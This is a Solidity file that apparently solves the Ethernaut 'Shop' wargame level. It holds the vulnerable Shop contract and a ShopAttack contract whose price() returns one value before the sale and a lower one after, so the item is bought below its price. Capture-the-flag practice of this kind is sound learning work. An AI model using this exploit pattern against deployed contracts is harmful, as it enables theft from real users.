// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

/* Used to solve level 21 (Shop) in Ethernaut. 
 * Also super easy level. If statements exist.
*/
contract ShopAttack is Buyer {
    Shop shop;
    constructor(Shop s) public {
        shop = s;
    }

    function price() external view override returns(uint) {
        if(shop.isSold()) {
            return 0;
        }
        else {
            return 100;
        }
    }

    function buyNow() external {
        shop.buy();
    }

}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
